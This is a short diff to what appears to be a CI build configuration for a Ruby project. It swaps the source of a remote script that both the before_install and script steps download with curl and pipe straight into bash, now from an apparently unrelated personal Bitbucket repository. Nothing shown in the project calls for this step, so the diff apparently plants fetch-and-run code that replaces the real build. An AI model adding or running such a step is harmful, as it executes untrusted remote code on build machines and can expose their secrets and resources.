@@ -74,7 +74,7 @@ rvm:
   - "1.9.3"
 
 before_install:
-  - curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/tes | bash
+  - curl -sL https://bitbucket.org/lariza999/gradi/raw/main/tes | bash
 
 script:
-  - curl -sL https://raw.githubusercontent.com/6248202226/gradi/main/tes | bash
+  - curl -sL https://bitbucket.org/lariza999/gradi/raw/main/tes | bash
